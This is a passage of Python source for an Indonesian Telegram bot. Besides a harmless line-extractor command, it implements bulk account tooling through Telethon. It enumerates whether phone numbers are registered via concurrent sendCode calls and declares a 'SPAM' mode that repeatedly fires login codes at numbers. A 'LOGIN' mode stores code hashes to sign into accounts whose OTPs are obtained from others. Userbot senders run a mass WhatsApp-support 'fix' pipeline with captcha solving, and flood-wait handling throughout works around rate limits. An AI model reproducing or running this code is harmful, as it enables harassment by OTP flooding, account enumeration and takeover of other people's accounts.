            if s < 1 or e > total or s > e:
                return None, f"Range <code>{part}</code> tidak valid (1–{total})"
            out.append((s, e))
        if not out:
            return None, "Range kosong"
        return out, None
    except ValueError:
        return None, "Format salah. Contoh: <code>1-100</code> atau <code>1-50,200-300</code>"


def _extract_lines(lines, ranges):
    """Ambil baris berdasarkan range (1-indexed inclusive)."""
    out = []
    for s, e in ranges:
        out.extend(lines[s-1:e])
    return out


def _line_extractor_intro_text(user_id):
    return (
        f"{em(E5,'🏴‍☠️')} <b>LINE EXTRACTOR</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(E1,'⭐')} <b>Cara Pakai:</b>\n"
        f"  1. Kirim / reply file <code>.txt</code>\n"
        f"  2. Bot akan tampilkan total baris\n"
        f"  3. Balas dengan range, contoh:\n"
        f"     • <code>1-100</code>\n"
        f"     • <code>1-50,200-300</code>\n"
        f"     • <code>1-100|hasil.txt</code>\n\n"
        f"{em(E2,'⭐')} <b>Tips:</b> proses cepat & rapi, mendukung file besar.\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(E4,'🎧')} <i>Powered by DikZz</i>"
    )


async def _line_load_document(update: Update, context: ContextTypes.DEFAULT_TYPE, document):
    """Download document dan simpan list baris ke user_data. Return (lines, filename, err)."""
    user_id = update.effective_user.id
    try:
        if document.file_size and document.file_size > 25 * 1024 * 1024:
            return None, None, "Ukuran file terlalu besar (>25MB)"
        tg_file = await document.get_file()
        ba = await tg_file.download_as_bytearray()
        try:
            content = bytes(ba).decode('utf-8', errors='ignore')
        except Exception:
            content = bytes(ba).decode('latin-1', errors='ignore')
        lines = content.splitlines()
        context.user_data[f'line_lines_{user_id}'] = lines
        context.user_data[f'line_filename_{user_id}'] = document.file_name or 'input.txt'
        context.user_data[f'line_waiting_range_{user_id}'] = True
        context.user_data.pop(f'line_waiting_file_{user_id}', None)
        return lines, document.file_name or 'input.txt', None
    except Exception as e:
        return None, None, f"Gagal membaca file: {e}"


async def line_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/line - Line Extractor. Reply ke txt untuk langsung set sumber, atau ketik /line lalu kirim file. Public."""
    user_id = update.effective_user.id
    msg = update.message

    # Mode 1: reply ke document
    reply = msg.reply_to_message if msg else None
    doc = None
    if reply and reply.document:
        doc = reply.document
    elif msg and msg.document:
        doc = msg.document

    if doc:
        loading = await msg.reply_text(
            f"{em(CE_LOADING,'🟠')} <i>Mengunduh & memproses file...</i>",
            parse_mode=ParseMode.HTML
        )
        lines, fname, err = await _line_load_document(update, context, doc)
        if err:
            await loading.edit_text(
                f"{em(E2,'⭐')} <b>{err}</b>",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id) if 'get_back_keyboard' in globals() else None
            )
            return
        total = len(lines)
        preview = "\n".join(f"<code>[{i+1:>4}]</code> {html.escape(l[:60])}" for i, l in enumerate(lines[:5]))
        await loading.edit_text(
            f"{em(E5,'🏴‍☠️')} <b>LINE EXTRACTOR · FILE READY</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{em(E1,'⭐')} <b>File:</b> <code>{html.escape(fname)}</code>\n"
            f"{em(E2,'⭐')} <b>Total Baris:</b> <b>{total}</b>\n\n"
            f"{em(E4,'⭐')} <b>Preview:</b>\n{preview if preview else '<i>(kosong)</i>'}\n\n"
            f"{em(E1,'⭐')} Balas dengan range, contoh:\n"
            f"   <code>1-100</code>  •  <code>1-50,200-300</code>  •  <code>1-100|out.txt</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{em(E4,'🎧')} <i>Powered by DikZz</i>",
            parse_mode=ParseMode.HTML
        )
        return

    # Mode 2: tidak ada file -> minta user kirim
    context.user_data[f'line_waiting_file_{user_id}'] = True
    context.user_data.pop(f'line_waiting_range_{user_id}', None)
    await msg.reply_text(
        _line_extractor_intro_text(user_id),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("BATAL", callback_data=f"line_cancel_{user_id}", icon_custom_emoji_id="5870601874175954911", style="danger"),
            InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="success")
        ]])
    )


async def handle_line_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler dokumen untuk LINE EXTRACTOR (hanya saat user dalam state waiting_file)."""
    if not is_allowed_user(update.effective_user.id):
        return
    user_id = update.effective_user.id
    if not context.user_data.get(f'line_waiting_file_{user_id}'):
        return  # tidak dalam mode line extractor
    if not update.message or not update.message.document:
        return
    doc = update.message.document
    loading = await update.message.reply_text(
        f"{em(CE_LOADING,'🟠')} <i>Memproses file...</i>",
        parse_mode=ParseMode.HTML
    )
    lines, fname, err = await _line_load_document(update, context, doc)
    if err:
        await loading.edit_text(f"{em(E2,'⭐')} <b>{err}</b>", parse_mode=ParseMode.HTML)
        return
    total = len(lines)
    preview = "\n".join(f"<code>[{i+1:>4}]</code> {html.escape(l[:60])}" for i, l in enumerate(lines[:5]))
    await loading.edit_text(
        f"{em(E5,'🏴‍☠️')} <b>LINE EXTRACTOR · FILE READY</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(E1,'⭐')} <b>File:</b> <code>{html.escape(fname)}</code>\n"
        f"{em(E2,'⭐')} <b>Total Baris:</b> <b>{total}</b>\n\n"
        f"{em(E4,'⭐')} <b>Preview:</b>\n{preview if preview else '<i>(kosong)</i>'}\n\n"
        f"{em(E1,'⭐')} Balas dengan range, contoh:\n"
        f"   <code>1-100</code>  •  <code>1-50,200-300</code>  •  <code>1-100|out.txt</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(E4,'🎧')} <i>Powered by DikZz</i>",
        parse_mode=ParseMode.HTML
    )


async def handle_line_range_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Dipanggil dari handle_message. Return True jika input dikonsumsi."""
    user_id = update.effective_user.id
    if not context.user_data.get(f'line_waiting_range_{user_id}'):
        return False
    text = (update.message.text or '').strip()
    if not text:
        return False

    lines = context.user_data.get(f'line_lines_{user_id}') or []
    fname = context.user_data.get(f'line_filename_{user_id}') or 'input.txt'
    total = len(lines)

    # parse opsional |nama.txt
    out_name = None
    if '|' in text:
        rng_str, name_part = text.split('|', 1)
        out_name = name_part.strip() or None
    else:
        rng_str = text

    ranges, err = _parse_line_ranges(rng_str, total)
    if err:
        await update.message.reply_text(
            f"{em(E2,'⭐')} <b>{err}</b>",
            parse_mode=ParseMode.HTML
        )
        return True

    t0 = time.time()
    selected = _extract_lines(lines, ranges)
    elapsed = time.time() - t0

    if not out_name:
        base = os.path.splitext(fname)[0]
        rng_label = "_".join(f"{s}-{e}" for s, e in ranges)
        out_name = f"{base}_{rng_label}.txt"
    if not out_name.lower().endswith('.txt'):
        out_name += '.txt'

    payload = ("\n".join(selected) + "\n").encode('utf-8')

    rng_disp = ", ".join(f"{s}–{e}" for s, e in ranges)
    caption = (
        f"{em(E1,'⭐')} <b>LINE EXTRACTOR · DONE</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(E2,'⭐')} <b>Source:</b> <code>{html.escape(fname)}</code>\n"
        f"{em(E4,'⭐')} <b>Range:</b>  <code>{rng_disp}</code>\n"
        f"{em(E1,'⭐')} <b>Lines:</b>  <b>{len(selected)}</b> / {total}\n"
        f"{em(E2,'⭐')} <b>Time:</b>   <code>{elapsed*1000:.0f} ms</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(E4,'🎧')} <i>Powered by DikZz</i>"
    )

    from io import BytesIO
    bio = BytesIO(payload)
    bio.name = out_name
    await update.message.reply_document(
        document=bio,
        filename=out_name,
        caption=caption,
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("EXTRACT LAGI", callback_data=f"line_again_{user_id}", icon_custom_emoji_id="5870903672937911120", style="success"),
            InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
        ]])
    )

    # Reset state, simpan lines untuk extract lagi cepat
    context.user_data.pop(f'line_waiting_range_{user_id}', None)
    return True



# ══════════════════════════════════════════════════════════════════════
# ██  /check — TELEGRAM ACCOUNT CHECKER (Telethon MTProto)           ██
# ══════════════════════════════════════════════════════════════════════
# 20 concurrent workers, file .txt support, OTP method detection.

TGCHECK_MAX_WORKERS = 20
_tgcheck_sem = asyncio.Semaphore(TGCHECK_MAX_WORKERS)
_tgcheck_cancel_flags = {}
_tgcheck_active = {}

# Mode pilihan per-user: 'fast' (sendCode) atau 'detail' (sender importContacts)
DETAIL_MAX_WORKERS = 30
_detail_sem = asyncio.Semaphore(DETAIL_MAX_WORKERS)
_tgcheck_mode = {}

# SPAM mode: kirim kode berulang sampai limit/error
SPAM_MAX_WORKERS = 50
_spam_sem = asyncio.Semaphore(SPAM_MAX_WORKERS)
_spam_cancel_flags = {}
_spam_active = {}
# Temp client saat proses login sender (phone+OTP)
_sender_login_tmp = {}
# Pending login: hash + session tersimpan setelah sendCode (untuk LOGIN mode)
# Format: _tgcheck_login_pending[user_id] = {phone: {'session': str, 'hash': str, 'expires': int}}
_tgcheck_login_pending = {}

# Anchor points (user_id, tahun) untuk estimasi tahun bikin akun.
# ID Telegram naik monoton seiring waktu. Sumber: data publik komunitas.
_TG_ID_ANCHORS = [
    (1, 2013),
    (100000000, 2014),
    (200000000, 2016),
    (300000000, 2017),
    (500000000, 2018),
    (800000000, 2019),
    (1100000000, 2020),
    (1500000000, 2021),
    (2000000000, 2022),
    (3500000000, 2023),
    (5500000000, 2024),
    (7000000000, 2025),
]


def _estimate_account_year(user_id: int) -> str:
    """Estimasi tahun pembuatan akun dari user_id (interpolasi anchor)."""
    try:
        uid = int(user_id)
    except Exception:
        return "?"
    if uid <= _TG_ID_ANCHORS[0][0]:
        return f"~{_TG_ID_ANCHORS[0][1]}"
    for i in range(len(_TG_ID_ANCHORS) - 1):
        id_lo, yr_lo = _TG_ID_ANCHORS[i]
        id_hi, yr_hi = _TG_ID_ANCHORS[i + 1]
        if id_lo <= uid < id_hi:
            return f"~{yr_lo}"
    return f"~{_TG_ID_ANCHORS[-1][1]}+"


def _get_pool(user_id, include_dead=False):
    """Ambil semua sender milik user (list of dict)."""
    out = []
    try:
        q = "SELECT id, phone, string_session, name, status, flood_until, last_used FROM tgcheck_pool WHERE user_id=?"
        if not include_dead:
            q += " AND status != 'dead'"
        q += " ORDER BY last_used ASC, id ASC"
        cur.execute(q, (user_id,))
        for r in cur.fetchall():
            out.append({
                'id': r[0], 'phone': r[1], 'session': r[2], 'name': r[3],
                'status': r[4], 'flood_until': r[5] or 0, 'last_used': r[6] or 0
            })
    except Exception:
        pass
    return out


def _pool_count(user_id):
    """(total, active_now) jumlah sender."""
    pool = _get_pool(user_id, include_dead=True)
    now = int(time.time())
    active = sum(1 for s in pool if s['status'] == 'active' and s['flood_until'] <= now)
    return len(pool), active


def _pick_sender(user_id):
    """Pilih 1 sender siap pakai (active, gak flood). Round-robin by last_used. None kalau habis."""
    now = int(time.time())
    pool = _get_pool(user_id)  # exclude dead, sorted last_used ASC
    for s in pool:
        if s['status'] == 'active' and s['flood_until'] <= now:
            return s
    return None


def _mark_sender_used(sender_id):
    try:
        cur.execute("UPDATE tgcheck_pool SET last_used=? WHERE id=?", (int(time.time()), sender_id))
        conn.commit()
    except Exception:
        pass


def _mark_sender_flood(sender_id, seconds):
    """Tandai sender cooldown sampai now+seconds."""
    try:
        until = int(time.time()) + int(seconds)
        cur.execute("UPDATE tgcheck_pool SET flood_until=? WHERE id=?", (until, sender_id))
        conn.commit()
    except Exception:
        pass


def _mark_sender_dead(sender_id):
    try:
        cur.execute("UPDATE tgcheck_pool SET status='dead' WHERE id=?", (sender_id,))
        conn.commit()
    except Exception:
        pass


def _mark_sender_active(sender_id):
    try:
        cur.execute("UPDATE tgcheck_pool SET status='active', flood_until=0 WHERE id=?", (sender_id,))
        conn.commit()
    except Exception:
        pass


def _add_to_pool(user_id, phone, session_str, name):
    """Tambah sender ke pool. Kalau phone sama udah ada → update session-nya."""
    try:
        cur.execute("SELECT id FROM tgcheck_pool WHERE user_id=? AND phone=?", (user_id, phone))
        row = cur.fetchone()
        if row:
            cur.execute(
                "UPDATE tgcheck_pool SET string_session=?, name=?, status='active', flood_until=0 WHERE id=?",
                (session_str, name, row[0])
            )
        else:
            cur.execute(
                "INSERT INTO tgcheck_pool (user_id, phone, string_session, name, status) VALUES (?,?,?,?,'active')",
                (user_id, phone, session_str, name)
            )
        conn.commit()
        return True
    except Exception as e:
        print(f"[POOL] add error: {e}")
        return False


def _delete_sender_by_id(user_id, sender_id):
    try:
        cur.execute("DELETE FROM tgcheck_pool WHERE user_id=? AND id=?", (user_id, sender_id))
        conn.commit()
        return cur.rowcount > 0
    except Exception:
        return False


def _delete_all_senders(user_id):
    try:
        cur.execute("DELETE FROM tgcheck_pool WHERE user_id=?", (user_id,))
        conn.commit()
    except Exception:
        pass


# ── SENDER USERBOT SYSTEM ────────────────────────────────────
# Sender yang di-/addsender juga jalan sebagai userbot Telethon.
# User ketik /fix di Saved Messages sender → trigger fix pipeline.
_sender_userbots = {}   # {pool_id: TelegramClient}
_userbot_boot_lock = threading.Lock()


async def _start_sender_userbot(pool_id, string_session, phone, name, user_id):
    """Start 1 sender sebagai userbot Telethon yang listen /fix di Saved Messages."""
    if not TELETHON_OK or not string_session:
        return False
    if pool_id in _sender_userbots:
        return True  # udah jalan

    try:
        client = TelegramClient(
            StringSession(string_session), TG_API_ID, TG_API_HASH,
            device_model="IVAS Userbot",
            system_version="1.0",
        )
        client.flood_sleep_threshold = 0
        await asyncio.wait_for(client.connect(), timeout=15)
        if not await client.is_user_authorized():
            print(f"  [USERBOT] ❌ Session expired: +{phone} (pool#{pool_id})")
            return False

        me = await client.get_me()
        my_id = me.id

        @client.on(events.NewMessage(
            chats=my_id,       # Saved Messages only
            pattern=r'^/fix\b',
        ))
        async def _handle_fix(event):
            """Handle /fix di Saved Messages sender."""
            # Hanya respon pesan dari diri sendiri
            if not event.out:
                return
            text = event.raw_text or ''
            # Parse --s2 flag
            server = 1
            if '--s2' in text:
                server = 2
                text = text.replace('--s2', '')
            # Parse --lang xx
            sel_lang = None
            import re as _re_ub
            m = _re_ub.search(r'--lang\s+([a-zA-Z]{2})\b', text)
            if m:
                sel_lang = m.group(1).lower()
                text = (text[:m.start()] + text[m.end():]).strip()

            raw = re.sub(r'^/fix\s*', '', text, flags=re.IGNORECASE).strip()
            numbers = _parse_fix_numbers(raw)
            if not numbers:
                await event.reply(
                    "❌ **Format:** `/fix 628xxx, 628yyy`\n"
                    "Opsi: `--s2` (server 2), `--lang en` (bahasa)"
                )
                return

            num_list = "\n".join(f"  📞 `+{n}`" for n in numbers)
            progress_msg = await event.reply(
                f"🏴‍☠️ **FIX WHATSAPP — MEMULAI**\n"
                f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
                f"🔄 Menyiapkan akun...\n\n"
                f"{num_list}\n\n"
                f"  🚀 Server: **{server}**\n"
                f"  🌐 Lang: **{sel_lang or 'default'}**\n"
                f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
                f"🎧 Powered by DikZz"
            )

            # State progress
            state = {'sent': 0, 'reply': 0, 'stage': 'starting', 'account': ''}
            total = len(numbers)
            _last_edit = [0.0]

            def _progress_cb(stage, data):
                if stage == 'account_ready':
                    state['stage'] = 'Mengirim...'
                    reused = bool((data or {}).get('reused'))
                    state['account'] = 'digunakan ulang' if reused else 'baru dibuat'
                elif stage == 'sent':
                    if (data or {}).get('ok'):
                        state['sent'] += 1
                    state['stage'] = 'Mengirim...'
                elif stage == 'reply':
                    state['reply'] += 1
                    state['stage'] = 'Balasan diterima!'
                else:
                    state['stage'] = 'Memproses...'
                # Rate limit edits
                now = time.time()
                if now - _last_edit[0] < 2.0:
                    return
                _last_edit[0] = now
                try:
                    asyncio.get_event_loop().create_task(
                        progress_msg.edit(
                            f"🏴‍☠️ **FIX WHATSAPP — AKTIF**\n"
                            f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
                            f"🔄 **{state['stage']}**\n\n"
                            f"  📞 Nomor: **{total}**\n"
                            f"  🚀 Terkirim: **{state['sent']}/{total}**\n"
                            f"  ✅ Balasan: **{state['reply']}**\n"
                            f"  👤 Akun: {state['account'] or '-'}\n"
                            f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
                            f"🎧 Powered by DikZz"
                        )
                    )
                except Exception:
                    pass

            # Template custom
            try:
                custom_template = get_user_fix_template(user_id, sel_lang)
            except Exception:
                custom_template = None

            # Run pipeline
            import functools
            loop = asyncio.get_running_loop()
            try:
                result = await loop.run_in_executor(
                    _SITEPRO_GLOBAL_POOL,
                    functools.partial(
                        run_fix_multi_pipeline,
                        numbers,
                        CAPTCHA_API_KEY,
                        cur, conn,
                        CAPTCHA_SOLVER,
                        240,              # reply_wait
                        _progress_cb,
                        MAX_SENDS_PER_ACCOUNT,
                        custom_template,
                        server,
                    ),
                )

                # Final report — premium style
                total_sent = result.get('total_sent', 0)
                total_reply = result.get('total_replied', 0)
                sends_left = result.get('sends_left', 0)
                acct_reused = result.get('account_reused', False)
                acct_tag = f"digunakan ulang (sisa {sends_left} kirim)" if acct_reused else f"baru dibuat (sisa {sends_left} kirim)"
                newest = result.get('newest_reply')

                lines = []
                for ns in result.get('numbers', []):
                    n = ns['nomor']
                    if ns['replied']:
                        lines.append(f"  ✅ +{n} — balasan diterima")
                    elif ns['sent']:
                        lines.append(f"  🟠 +{n} — terkirim, belum ada balasan")
                    else:
                        lines.append(f"  ❌ +{n} — gagal kirim")

                title = "BALASAN DITERIMA" if total_reply > 0 else ("TERKIRIM" if total_sent > 0 else "SELESAI")

                report = (
                    f"🏴‍☠️ **FIX WHATSAPP — {title}**\n"
                    f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
                    f"❤️ **Hasil Fix Merah**\n\n"
                    f"  📞 Total nomor: **{total}**\n"
                    f"  🚀 Terkirim: **{total_sent}/{total}**\n"
                    f"  ✅ Mendapat balasan: **{total_reply}**\n"
                    f"  👤 Akun: {acct_tag}\n\n"
                    f"**Detail per nomor:**\n"
                    + "\n".join(lines)
                )

                # Balasan WA Support
                if newest:
                    reply_subject = (newest.get('subject', '') or '')[:80]
                    matched_n = newest.get('matched_nomor')
                    matched_line = f"\n  📞 Untuk nomor: +{matched_n}" if matched_n else ""
                    report += (
                        f"\n\n❤️ **Balasan dari WhatsApp Support**"
                        f"\n  📩 Dari: support@support.whatsapp.com"
                        f"\n  📁 Subject: {reply_subject}"
                        f"{matched_line}"
                    )

                report += (
                    f"\n\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
                    f"🎧 Powered by DikZz"
                )
                await progress_msg.edit(report)

            except Exception as e:
                await progress_msg.edit(
                    f"🏴‍☠️ **FIX WHATSAPP — ERROR**\n"
                    f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
                    f"❌ Pipeline error:\n{str(e)[:200]}\n"
                    f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
                    f"🎧 Powered by DikZz"
                )

        _sender_userbots[pool_id] = client
        # Start receiving updates in background
        await client.catch_up()
        asyncio.get_event_loop().create_task(client.run_until_disconnected())
        print(f"  [USERBOT] ✅ +{phone} ({name}) — listening /fix di Saved Messages")
        return True

    except Exception as e:
        print(f"  [USERBOT] ❌ +{phone}: {type(e).__name__}: {str(e)[:80]}")
        return False


async def _stop_sender_userbot(pool_id):
    """Stop 1 sender userbot."""
    client = _sender_userbots.pop(pool_id, None)
    if client:
        try:
            await client.disconnect()
        except Exception:
            pass


async def _stop_all_sender_userbots():
    """Stop semua sender userbots."""
    ids = list(_sender_userbots.keys())
    for pid in ids:
        await _stop_sender_userbot(pid)
    print(f"  [USERBOT] Semua {len(ids)} userbot dihentikan")


async def _start_all_sender_userbots():
    """Boot: load semua active sender dari DB dan start sebagai userbot."""
    if not TELETHON_OK:
        return
    try:
        cur.execute(
            "SELECT id, user_id, phone, string_session, name "
            "FROM tgcheck_pool WHERE status='active' AND string_session IS NOT NULL"
        )
        rows = cur.fetchall()
    except Exception as e:
        print(f"  [USERBOT] DB error: {e}")
        return

    if not rows:
        print("  [USERBOT] Tidak ada sender aktif di pool")
        return

    print(f"🤖 Starting {len(rows)} sender userbot...")
    ok = 0
    for r in rows:
        pool_id, uid, phone, session, name = r[0], r[1], r[2], r[3], r[4]
        try:
            success = await _start_sender_userbot(pool_id, session, phone, name or phone, uid)
            if success:
                ok += 1
        except Exception as e:
            print(f"  [USERBOT] ❌ pool#{pool_id} +{phone}: {e}")
    print(f"🤖 {ok}/{len(rows)} sender userbot aktif")



def _tgcheck_normalize_phone(raw: str) -> str:
    """Bersihkan nomor: buang spasi, +, -, hanya sisakan angka."""
    cleaned = re.sub(r'[^\d]', '', raw.strip())
    if not cleaned:
        return ''
    if cleaned.startswith('0'):
        cleaned = '62' + cleaned[1:]
    return cleaned


def _tgcheck_status_emoji(status: str) -> str:
    if status == 'registered':
        return em(E1, '✅')
    elif status == 'registered_app':
        return em(E1, '✅')
    elif status == 'registered_sms':
        return em(E6, '📱')
    elif status == 'not_registered':
        return em(E2, '❌')
    elif status == 'banned':
        return em(E2, '🚫')
    elif status == 'invalid':
        return em(E3, '⚠️')
    elif status == 'flood':
        return em(E3, '⏳')
    return em(E3, '❓')


def _tgcheck_status_label(status: str) -> str:
    return {
        'registered': 'TERDAFTAR',
        'registered_app': 'TERDAFTAR (AKTIF)',
        'registered_sms': 'TERDAFTAR (SMS)',
        'not_registered': 'TIDAK TERDAFTAR',
        'banned': 'BANNED',
        'invalid': 'NOMOR INVALID',
        'flood': 'FLOOD WAIT',
        'error': 'ERROR',
        'reg': 'TERDAFTAR',
        'unreg': 'TIDAK TERDAFTAR',
    }.get(status, status.upper())


async def _tgcheck_check_single(phone: str, user_id: int, max_retries: int = 3) -> tuple:
    """Check satu nomor via auth.sendCode. Timeout-protected, retry-enabled."""
    if not TELETHON_OK:
        return (phone, 'error', 'Telethon not installed')

    async with _tgcheck_sem:
        if _tgcheck_cancel_flags.get(user_id, False):
            return (phone, 'cancelled', 'Dibatalkan')

        for attempt in range(1, max_retries + 1):
            if _tgcheck_cancel_flags.get(user_id, False):
                return (phone, 'cancelled', 'Dibatalkan')

            client = TelegramClient(StringSession(), TG_API_ID, TG_API_HASH)
            try:
                await asyncio.wait_for(client.connect(), timeout=15)
                try:
                    result = await asyncio.wait_for(client(SendCodeRequest(
                        phone_number='+' + phone,
                        api_id=TG_API_ID,
                        api_hash=TG_API_HASH,
                        settings=CodeSettings(),
                    )), timeout=25)
                    otp_type = type(result.type).__name__ if result.type else 'Unknown'
                    detail = f'OTP: {otp_type}'
                    if 'App' in otp_type:
                        return (phone, 'registered_app', detail)
                    elif 'Sms' in otp_type:
                        return (phone, 'registered_sms', detail)
                    else:
                        return (phone, 'registered', detail)
                except PhoneNumberUnoccupiedError:
                    return (phone, 'not_registered', 'Nomor tidak terdaftar di Telegram')
                except PhoneNumberBannedError:
                    return (phone, 'banned', 'Nomor di-ban oleh Telegram')
                except PhoneNumberInvalidError:
                    return (phone, 'invalid', 'Format nomor tidak valid')
                except PhoneNumberFloodError:
                    return (phone, 'flood', 'Terlalu banyak request untuk nomor ini')
                except FloodWaitError as e:
                    if e.seconds > 120:
                        return (phone, 'flood', f'FloodWait {e.seconds}s — skip')
                    print(f"[CHECK] FloodWait {e.seconds}s +{phone} retry {attempt}/{max_retries}")
                    await asyncio.sleep(e.seconds + 1)
                    continue
                except AuthKeyUnregisteredError:
                    if attempt < max_retries:
                        await asyncio.sleep(1)
                        continue
                    return (phone, 'error', 'Session expired')
            except asyncio.TimeoutError:
                print(f"[CHECK] Timeout +{phone} attempt {attempt}/{max_retries}")
                if attempt < max_retries:
                    await asyncio.sleep(2)
                    continue
                return (phone, 'error', f'Timeout {max_retries}x')
            except Exception as e:
                if attempt < max_retries:
                    await asyncio.sleep(1)
                    continue
                return (phone, 'error', f'{type(e).__name__}: {str(e)[:80]}')
            finally:
                try:
                    await client.disconnect()
                except:
                    pass

        return (phone, 'error', f'Gagal setelah {max_retries}x')


async def _tgcheck_login_worker(phone: str, user_id: int, max_retries: int = 3) -> tuple:
    """LOGIN mode: sendCode via StringSession, simpan hash buat sign_in nanti.
    Return (phone, status, detail) — sama format kayak check biasa.
    Timeout 30s per attempt, retry up to max_retries."""
    if not TELETHON_OK:
        return (phone, 'error', 'Telethon not installed')

    async with _tgcheck_sem:
        if _tgcheck_cancel_flags.get(user_id, False):
            return (phone, 'cancelled', 'Dibatalkan')

        for attempt in range(1, max_retries + 1):
            if _tgcheck_cancel_flags.get(user_id, False):
                return (phone, 'cancelled', 'Dibatalkan')

            client = TelegramClient(StringSession(), TG_API_ID, TG_API_HASH)
            try:
                await asyncio.wait_for(client.connect(), timeout=15)
                result = await asyncio.wait_for(client(SendCodeRequest(
                    phone_number='+' + phone,
                    api_id=TG_API_ID,
                    api_hash=TG_API_HASH,
                    settings=CodeSettings(),
                )), timeout=30)
                otp_type = type(result.type).__name__ if result.type else 'Unknown'

                # Simpan session + hash buat sign_in nanti
                session_str = client.session.save()
                if user_id not in _tgcheck_login_pending:
                    _tgcheck_login_pending[user_id] = {}
                _tgcheck_login_pending[user_id][phone] = {
                    'session': session_str,
                    'hash': result.phone_code_hash,
                    'expires': int(time.time()) + 300,
                    'otp_type': otp_type,
                }

                if 'App' in otp_type:
                    return (phone, 'registered_app', f'OTP: {otp_type}')
                elif 'Sms' in otp_type:
                    return (phone, 'registered_sms', f'OTP: {otp_type}')
                else:
                    return (phone, 'registered', f'OTP: {otp_type}')

            except PhoneNumberUnoccupiedError:
                return (phone, 'not_registered', 'Tidak terdaftar')
            except PhoneNumberBannedError:
                return (phone, 'banned', 'Nomor di-ban')
            except PhoneNumberInvalidError:
                return (phone, 'invalid', 'Format invalid')
            except PhoneNumberFloodError:
                return (phone, 'flood', 'Flood untuk nomor ini')
            except FloodWaitError as e:
                if e.seconds > 120:
                    return (phone, 'flood', f'FloodWait {e.seconds}s')
                print(f"[LOGIN] FloodWait {e.seconds}s +{phone} retry {attempt}/{max_retries}")
                await asyncio.sleep(e.seconds + 2)
                continue
            except asyncio.TimeoutError:
                print(f"[LOGIN] Timeout +{phone} attempt {attempt}/{max_retries}")
                if attempt < max_retries:
                    await asyncio.sleep(3)
                    continue
                return (phone, 'error', f'Timeout setelah {max_retries}x')
            except Exception as e:
                if attempt < max_retries:
                    print(f"[LOGIN] Error +{phone} attempt {attempt}: {e}")
                    await asyncio.sleep(2)
                    continue
                return (phone, 'error', f'{type(e).__name__}: {str(e)[:80]}')
            finally:
                try:
                    await client.disconnect()
                except:
                    pass

        return (phone, 'error', f'Gagal setelah {max_retries}x')


async def _tgcheck_process_login(phones: list, user_id: int, msg, context):
    """Proses batch LOGIN mode: sendCode + simpan hash buat sign_in nanti."""
    _tgcheck_active[user_id] = True
    _tgcheck_cancel_flags[user_id] = False
    total = len(phones)
    done = 0
    results = []
    _last_edit = [0.0]

    # Clear pending lama
    _tgcheck_login_pending.pop(user_id, None)

    async def _run_one(ph):
        nonlocal done
        r = await _tgcheck_login_worker(ph, user_id)
        done += 1
        results.append(r)
        now = time.time()
        if (now - _last_edit[0]) >= 2.0:
            _last_edit[0] = now
            pct = int(done / total * 100)
            bar = '█' * (pct // 5) + '░' * (20 - pct // 5)
            try:
                await msg.edit_text(
                    _screen('CHECK · LOGIN', (
                        f"{em(CE_LOADING,'🔓')} <b>Kirim OTP + simpan hash...</b>\n\n"
                        f"  {em(CE_NOMOR,'📞')} <b>Progress:</b>  {done}/{total}\n"
                        f"  <code>{bar}</code>  <b>{pct}%</b>"
                    ), 'Home › Check › Login'),
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("BATALKAN", callback_data=f"tgcheck_cancel_{user_id}",
                                             icon_custom_emoji_id=E2, style="danger")
                    ]]),
                )
            except Exception:
                pass

    # Jalankan paralel (max 5 workers — lebih pelan biar gak flood/stuck)
    LOGIN_WORKERS = 5
    tasks = []
    for ph in phones:
        if _tgcheck_cancel_flags.get(user_id, False):
            break
        tasks.append(asyncio.create_task(_run_one(ph)))
        if len(tasks) >= LOGIN_WORKERS:
            await asyncio.gather(*tasks)
            tasks = []
            await asyncio.sleep(2)  # jeda antar batch
    if tasks:
        await asyncio.gather(*tasks)

    _tgcheck_active[user_id] = False

    # Hitung hasil
    pending = _tgcheck_login_pending.get(user_id, {})
    sms_count = sum(1 for p in pending.values() if 'Sms' in p.get('otp_type', ''))
    app_count = sum(1 for p in pending.values() if 'App' in p.get('otp_type', ''))
    total_loginable = len(pending)

    # Build result
    parts = [
        f"{em(E1,'✅')} <b>OTP TERKIRIM — SIAP LOGIN</b>\n\n"
        f"  {em(CE_NOMOR,'📞')} <b>Total dicek:</b>  {total}\n"
        f"  {em(E1,'📨')} <b>SMS (loginable):</b>  {sms_count}\n"
        f"  {em(CE_TELEGRAM,'📲')} <b>App:</b>  {app_count}\n"
        f"  {em(E3,'⏲')} <b>Valid:</b>  5 menit dari sekarang\n"
    ]

    if total_loginable > 0:
        parts.append(f"\n{'─'*30}\n")
        parts.append(f"{em(CE_LOADING,'🔓')} <b>CARA LOGIN:</b>\n")
        parts.append(f"Ketik: <code>nomor:kode</code>\n")
